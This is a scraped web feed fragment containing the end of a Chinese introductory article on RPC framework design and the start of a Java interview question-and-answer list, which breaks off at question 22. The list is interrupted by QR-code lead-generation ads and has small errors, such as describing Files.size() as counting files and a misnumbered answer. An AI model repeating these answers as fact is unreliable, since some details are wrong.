  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-22T16:11:48.000Z" title="Sat Nov 22 2025 16:11:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>想要学好微服务，RPC框架肯定是一个绕不开的话题。在我看来，任何框架都是为了后续开发者的便利，帮我们封装好可重复利用的工具或者某些固定流程，RPC框架也不例外。RPC框架最重要的作用就是帮我们将多个服务连接起来，即实现<strong>远程调用</strong>，让我们能<strong>像调用本地方法一样调用别的服务里的方法</strong>。</p>
<p>简而言之，RPC框架就是将复杂的网络通信、序列化等操作封装起来，这是最重要的。当然，一个完整的生产级RPC框架还融合了更多模块来保证其健壮性和高性能，比如服务注册与发现、重试机制、容错（熔断）机制、基于TCP的自定义协议、负载均衡等。这篇文章为了“浅出”，我们先搭建一个简易RPC框架的骨架，讲讲各个核心模块的作用，暂不深入挖掘具体实现。</p>
<h3 data-id="heading-0">一、 网络通信</h3>
<p>首先，我们想要调用另一个服务的方法，必然要通过网络进行通信。最常见的就是消费者发送一个请求，提供者处理后再返回结果。那么，这个请求里需要包含哪些信息，提供者才能准确地找到并执行对应的方法呢？</p>
<p><strong>核心信息包括：</strong></p>
<ol>
<li><strong>接口全限定名</strong>：比如 <code>com.example.UserService</code>。告诉提供者“我要调用哪个服务接口”。</li>
<li><strong>方法名</strong>：比如 <code>getUserById</code>。告诉提供者“我要调用这个接口下的哪个方法”。</li>
<li><strong>参数类型</strong>：比如 <code>(java.lang.Long)</code>。方法可能会重载，只有方法名不够，还需要参数类型才能唯一确定一个方法。</li>
<li><strong>参数值</strong>：比如 <code>123L</code>。执行方法所需要的具体数据。</li>
<li><strong>版本号</strong>（可选）：如果接口有多个不兼容的版本，需要版本号来做区分。</li>
</ol>
<p><strong>通信协议的选择：</strong></p>
<ul>
<li><strong>HTTP</strong>：优点在于简单、通用，任何语言都支持。但对于高性能的RPC内部调用来说，HTTP协议的头部信息（Header）较大，效率不是最高。</li>
<li><strong>TCP + 自定义协议</strong>：高性能RPC框架（如Dubbo、gRPC）的常见选择。可以设计非常紧凑的二进制协议，减少不必要的网络开销，性能极高。这才是RPC框架网络层的精髓。</li>
</ul>
<p><strong>简单来说，网络通信模块就是RPC的远程调用的“核心”，负责将请求从客户端运送到服务端，再把结果运送回来。</strong></p>
<h3 data-id="heading-1">二、 代理对象</h3>
<p>既然我们的目标是“像调用本地方法一样”，那么我们在客户端代码里就不应该看到任何网络操作的痕迹（比如<code>HttpClient</code>）。如何实现这一点？答案就是：<strong>动态代理</strong>。</p>
<p>代理对象是RPC框架的“魔法师”，它对外伪装成真正的服务接口。当你调用 <code>userService.getUserById(123)</code>时，你实际上调用的是代理对象的方法。</p>
<p>这个代理对象在背后默默地做了以下事情：</p>
<ol>
<li><strong>拦截调用</strong>：它拦截了你对所有接口方法的调用。</li>
<li><strong>信息封装</strong>：它将你调用的方法名、参数类型、参数值等信息，按照和服务器约定好的格式封装起来。</li>
<li><strong>委托通信模块</strong>：它将封装好的数据交给<strong>网络通信</strong>模块发送给服务端。</li>
<li><strong>等待并返回结果</strong>：它同步等待网络返回，拿到结果数据后，再原样返回给你。</li>
</ol>
<p>这样，作为开发者的你，只需要关心接口的定义和调用，完全感知不到背后的网络请求。代理模式是实现RPC透明性的关键技术。</p>
<h3 data-id="heading-2">三、 注册中心</h3>
<p>在简单的RPC调用中，服务提供者的IP和端口可以直接写在消费者的配置里。但在微服务架构中，服务实例众多且会动态变化（扩缩容、宕机），这种“硬编码”的方式就无法工作了。这时就需要<strong>注册中心</strong>。</p>
<p>注册中心就像是微服务世界的 <strong>“服务列表”</strong>，存储了各种服务状态以及信息，让Consummer知道给哪个ip中的哪个端口发送消息。</p>
<ul>
<li><strong>服务注册</strong>：当一个服务提供者启动时，它会将自己的服务名（如<code>UserService</code>）和网络地址（如<code>192.168.1.10:8080</code>）注册到注册中心。</li>
<li><strong>服务发现</strong>：当一个服务消费者需要调用<code>UserService</code>时，它不再需要硬编码地址，而是去注册中心查询所有可用的<code>UserService</code>实例的地址列表。</li>
<li><strong>健康检查</strong>：注册中心会定期检查服务提供者的健康状态（心跳机制），如果发现某个实例宕机，就将其从地址列表中移除，确保消费者不会调用到已失效的节点。</li>
</ul>
<p><strong>常见的注册中心有：Nacos、Zookeeper、Consul、Eureka等。</strong> ​ 注册中心的存在是实现服务治理和高可用的基石。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/408592a6ecd54b9eb6d23ef53a55e2b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWFVONEo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764473391&amp;x-signature=FdpfkbCpv1Un%2BKw7FKv8rtmVHDk%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">四、 优化与扩展</h3>
<p>一个基础的RPC框架有了以上三个部分就可以运行了。但要成为一个成熟的生产级框架，还需要很多可优化和扩展的点。</p>
<p><strong>1. 多种序列化方式</strong></p>
<p>序列化是将对象转换为字节流的过程，反序列化则是其逆过程。不同的序列化协议在速度、体积、可读性、跨语言支持上各有优劣。提供多种选择（如JSON、Hessian、Protobuf、Kryo）可以让用户根据具体场景（如高性能、跨语言）进行权衡。</p>
<p><strong>2. 多种负载均衡策略</strong></p>
<p>当同一个服务有多个提供者时，消费者需要决定调用哪一个。这就是负载均衡。常见的策略有：</p>
<ul>
<li><strong>随机</strong>：从可用列表中随机选择一个。</li>
<li><strong>轮询</strong>：依次调用每一个提供者。</li>
<li><strong>最少活跃调用数</strong>：优先调用当前处理请求最少的服务器。</li>
<li><strong>一致性哈希</strong>：相同参数的请求总是发到同一提供者，适用于需要缓存的场景。</li>
</ul>
<p><strong>3. 多种网络通信协议</strong></p>
<p>除了支持基本的TCP自定义协议，还可以扩展支持HTTP/2、gRPC等协议，以适应不同的网络环境或生态集成。</p>
<p><strong>4. SPI机制</strong></p>
<p>SPI（Service Provider Interface）是一种服务发现机制。
它将接口的实现类配置在文件中，程序在运行时读取文件来加载具体的实现。不同于SpringBoot里将配置信息写在application中，可以实现某些配置信息与业务代码分离。SPI的作用是实现动态加载，其结合application就可以完美实现上述多种协议、多种序列化机制的动态选择。
<strong>利用SPI，框架的所有核心组件（如序列化、负载均衡、注册中心）都可以做成可插拔的</strong>，极大地提升了框架的扩展性。这是Dubbo等优秀框架设计的精髓。</p>
<p><strong>5. 重试机制与容错机制</strong></p>
<p>网络是不可靠的，调用可能会失败。框架需要提供容错策略。</p>
<ul>
<li>
<p><strong>重试机制</strong>：调用失败后自动重试，通常需要配合幂等设计。</p>
</li>
<li>
<p><strong>容错策略</strong>：</p>
<ul>
<li><strong>Failover</strong>（故障转移）：失败后自动重试其他服务器。</li>
<li><strong>Failfast</strong>（快速失败）：失败后立即报错，用于非幂等操作。</li>
<li><strong>Failsafe</strong>（安全失败）：失败后忽略，仅记录日志。</li>
<li><strong>熔断器机制</strong>：当故障达到一定阈值，自动“熔断”，防止故障雪崩，并在一段时间后尝试恢复。</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-4">总结</h3>
<p>让我们再串一下整个流程：消费者通过<strong>代理对象</strong>调用接口方法 -&gt; 代理对象将调用信息<strong>序列化</strong>​ -&gt; 通过<strong>网络通信</strong>模块发送请求 -&gt; 请求首先被发往<strong>注册中心</strong>进行服务发现，获取真实的服务地址 -&gt; 请求被发送到服务提供者 -&gt; 提供者<strong>反序列化</strong>请求，通过反射执行本地方法 -&gt; 将结果按原路返回。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java面试题总结（含答案）]]></title>    <link>https://juejin.cn/post/7575112613777834018</link>    <guid>https://juejin.cn/post/7575112613777834018</guid>    <pubDate>2025-11-23T06:02:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575112613777834018" data-draft-id="7575162322239815680" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java面试题总结（含答案）"/> <meta itemprop="keywords" content="后端,面试,Java"/> <meta itemprop="datePublished" content="2025-11-23T06:02:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java水解"/> <meta itemprop="url" content="https://juejin.cn/user/2441349519143037"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java面试题总结（含答案）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2441349519143037/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java水解
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T06:02:45.000Z" title="Sun Nov 23 2025 06:02:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读16分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h6 data-id="heading-0">发现网上很多Java面试题都没有答案，所以花了很长时间搜集整理出来了这套Java面试题大全~ <strong>这套互联网 Java 工程师面试题包括了：MyBatis、ZK、Dubbo、EL、Redis、MySQL、并发编程、Java面试、Spring、微服务、Linux、Springboot、SpringCloud、MQ、Kafka 面试专题</strong>  <strong>一、Java 基础</strong> <strong>1. JDK 和 JRE 有什么区别？</strong>  </h6>
<ul>
<li>JDK：Java Development Kit 的简称，java 开发工具包，提供了 java 的开发环境和运行环境。</li>
<li>JRE：Java Runtime Environment 的简称，java 运行环境，为 java 的运行提供了所需环境。</li>
</ul>
<p>具体来说 JDK 其实包含了 JRE，同时还包含了[编译 java] 源码的编译器 [javac]，还包含了很多 java 程序调试和分析的工具。简单来说：如果你需要运行 java 程序，只需安装 JRE 就可以了，如果你需要编写 java 程序，需要安装 JDK。<br/>
<strong>2. == 和 equals 的区别是什么？</strong><br/>
== 对于基本类型来说是值比较，对于引用类型来说是比较的是引用；而 equals 默认情况下是引用比较，只是很多类重新了 equals 方法，比如 String、Integer 等把它变成了值比较，所以一般情况下 equals 比较的是值是否相等。<br/>
<strong>3. 两个对象的 hashCode()相同，则 equals()也一定为 true，对吗？</strong><br/>
不对，两个对象的 hashCode()相同，equals()不一定 true。<br/>
代码解读：很显然“通话”和“重地”的 hashCode() 相同，然而 equals() 则为 false，因为在[散列表]中，hashCode()相等即两个键值对的哈希值相等，然而哈希值相等，并不一定能得出键值对相等。<br/>
<strong>4. final 在 java 中有什么作用？</strong><br/>
</p>
<ul>
<li>final 修饰的类叫最终类，该类不能被继承。</li>
<li>final 修饰的方法不能被重写。</li>
<li>final 修饰的变量叫常量，常量必须初始化，初始化之后值就不能被修改。</li>
</ul>
<p><strong>5. java 中的 Math.round(-1.5) 等于多少？</strong><br/>
等于 -1，因为在数轴上取值时，中间值（0.5）向右取整，所以正 0.5 是往上取整，负 0.5 是直接舍弃。<br/>
<strong>6. String 属于基础的数据类型吗？</strong><br/>
String 不属于基础类型，基础类型有 8 种：byte、boolean、char、short、int、float、long、double，而 String 属于对象。<br/>
<strong>7. java 中操作字符串都有哪些类？它们之间有什么区别？</strong><br/>
操作字符串的类有：String、StringBuffer、StringBuilder。<br/>
String 和 StringBuffer、StringBuilder 的区别在于 String 声明的是不可变的对象，每次操作都会生成新的 String 对象，然后将指针指向新的 String</p>
<blockquote>
<blockquote>
<p><strong>篇幅限制下面就只能给大家展示小册部分内容了。整理了一份核心面试笔记包括了：Java面试、Spring、JVM、MyBatis、Redis、MySQL、并发编程、微服务、Linux、Springboot、SpringCloud、MQ、Kafka 面试专题</strong></p>
<blockquote>
</blockquote>
<p><strong>需要全套面试笔记及答案【扫一扫】</strong>                    即可免费获取**</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d1134fb8ab14da08b3b633d1585cba9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764483585&amp;x-signature=Vh90fwbFeCv54lFdBGJtsGkM0X8%3D" alt="8fbf1ef8b61e2dbbb33b7690a41d12e.png" loading="lazy"/></p>
</blockquote>
<p>对象，而 StringBuffer、StringBuilder 可以在原有对象的基础上进行操作，所以在经常改变字符串内容的情况下最好不要使用 String。<br/>
StringBuffer 和 StringBuilder 最大的区别在于，StringBuffer 是线程安全的，而 StringBuilder 是非线程安全的，但 StringBuilder 的性能却高于 StringBuffer，所以在单线程环境下推荐使用 StringBuilder，多线程环境下推荐使用 StringBuffer。<br/>
<strong>8. String str="i"与 String str=new String("i")一样吗？</strong><br/>
不一样，因为内存的分配方式不一样。String str="i"的方式，java 虚拟机会将其分配到[常量池]中；而 String str=new String("i") 则会被分到堆内存中。<br/>
<strong>9. 如何将字符串反转？</strong><br/>
使用 StringBuilder 或者 stringBuffer 的 reverse() 方法。<br/>
<strong>10. String 类的常用方法都有那些？</strong></p>
<ul>
<li>indexOf()：返回指定字符的索引。</li>
<li>charAt()：返回指定索引处的字符。</li>
<li>replace()：字符串替换。</li>
<li>trim()：去除字符串两端空白。</li>
<li>split()：分割字符串，返回一个分割后的字符串数组。</li>
<li>getBytes()：返回字符串的 byte 类型数组。</li>
<li>length()：返回字符串长度。</li>
<li>toLowerCase()：将字符串转成小写字母。</li>
<li>toUpperCase()：将字符串转成大写字符。</li>
<li>substring()：截取字符串。</li>
<li>equals()：字符串比较。</li>
</ul>
<p><strong>11. 抽象类必须要有抽象方法吗？</strong><br/>
不需要，抽象类不一定非要有抽象方法。<br/>
</p>
<ul>
<li>普通类不能包含抽象方法，抽象类可以包含抽象方法。</li>
<li>抽象类不能直接实例化，普通类可以直接实例化。</li>
</ul>
<p><strong>13. 抽象类能使用 final 修饰吗？</strong><br/>
不能，定义抽象类就是让其他类继承的，如果定义为 final 该类就不能被继承，这样彼此就会产生矛盾，所以 final 不能修饰抽象类<br/>
<strong>14. 接口和抽象类有什么区别？</strong><br/>
</p>
<ul>
<li>实现：抽象类的子类使用 extends 来继承；接口必须使用 implements 来实现接口。</li>
<li>构造函数：抽象类可以有构造函数；接口不能有。</li>
<li>main 方法：抽象类可以有 main 方法，并且我们能运行它；接口不能有 main 方法。</li>
<li>实现数量：类可以实现很多个接口；但是只能继承一个抽象类。</li>
<li>访问修饰符：接口中的方法默认使用 public 修饰；抽象类中的方法可以是任意访问修饰符。</li>
</ul>
<p><strong>15. java 中 IO 流分为几种？</strong><br/>
按功能来分：输入流（input）、输出流（output）。<br/>
按类型来分：字节流和字符流。<br/>
字节流和字符流的区别是：字节流按 8 位传输以字节为单位输入输出数据，字符流按 16 位传输以字符为单位输入输出数据。<br/>
<strong>16. BIO、NIO、AIO 有什么区别？</strong><br/>
</p>
<ul>
<li>BIO：Block IO 同步阻塞式 IO，就是我们平常使用的传统 IO，它的特点是模式简单使用方便，并发处理能力低。</li>
<li>NIO：New IO 同步非阻塞 IO，是传统 IO 的升级，客户端和服务器端通过 Channel（通道）通讯，实现了多路复用。</li>
<li>AIO：Asynchronous IO 是 NIO 的升级，也叫 NIO2，实现了异步非堵塞 IO ，异步 IO 的操作基于事件和回调机制。</li>
</ul>
<p><strong>17. Files的常用方法都有哪些？</strong><br/>
</p>
<ul>
<li>
<p>Files.exists()：检测文件路径是否存在。</p>
</li>
<li>
<p>Files.createFile()：创建文件。</p>
</li>
<li>
<p>Files.createDirectory()：创建文件夹。</p>
</li>
<li>
<p>Files.delete()：删除一个文件或目录。</p>
</li>
<li>
<p>Files.copy()：复制文件。</p>
</li>
<li>
<p>Files.move()：移动文件。</p>
</li>
<li>
<p>Files.size()：查看文件个数。</p>
</li>
<li>
<p>Files.read()：读取文件。</p>
</li>
<li>
<p>Files.write()：写入文件。</p>
</li>
</ul>
<p><strong>二、容器</strong><br/>
<strong>18. java 容器都有哪些？</strong><br/>
常用容器的图录：<br/>
</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c491f90ead85489da6c3ff49e9a507e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764483585&amp;x-signature=U5zJhf%2BwK%2BI%2FW7ZLdeEZTE9lyXQ%3D" alt="" loading="lazy"/></p>
<p><strong>19. Collection 和 Collections 有什么区别？</strong><br/>
</p>
<ul>
<li>java.util.Collection 是一个集合接口（集合类的一个顶级接口）。它提供了对集合对象进行基本操作的通用接口方法。Collection接口在Java 类库中有很多具体的实现。Collection接口的意义是为各种具体的集合提供了最大化的统一操作方式，其直接继承接口有List与Set。</li>
<li>Collections则是集合类的一个工具类/帮助类，其中提供了一系列静态方法，用于对集合中元素进行排序、搜索以及线程安全等各种操作。</li>
</ul>
<p><strong>20. List、Set、Map 之间的区别是什么？</strong><br/>
</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5264903a4f074b50b673a66693add46f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764483585&amp;x-signature=tN03Yd6DCz9uHfDexX8seIR4DQs%3D" alt="" loading="lazy"/></p>
<p><strong>21. HashMap 和 Hashtable 有什么区别？</strong><br/>
</p>
<ul>
<li>
<p>hashMap去掉了HashTable 的contains方法，但是加上了containsValue（）和containsKey（）方法。</p>
</li>
<li>
<p>hashTable同步的，而HashMap是非同步的，效</p>
</li>
</ul>
<blockquote>
<blockquote>
<p><strong>篇幅限制下面就只能给大家展示小册部分内容了。整理了一份核心面试笔记包括了：Java面试、Spring、JVM、MyBatis、Redis、MySQL、并发编程、微服务、Linux、Springboot、SpringCloud、MQ、Kafka 面试专题</strong></p>
<blockquote>
</blockquote>
<p><strong>需要全套面试笔记及答案【扫一扫】</strong>                    即可免费获取**</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d1134fb8ab14da08b3b633d1585cba9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764483585&amp;x-signature=Vh90fwbFeCv54lFdBGJtsGkM0X8%3D" alt="8fbf1ef8b61e2dbbb33b7690a41d12e.png" loading="lazy"/></p>
</blockquote>
<pre><code class="hljs">率上逼hashTable要高。
</code></pre>
<ul>
<li>hashMap允许空键值，而hashTable不允许。</li>
</ul>
<p><strong>22. 如何决定使用 HashMap 还是 TreeMap？</strong><br/>
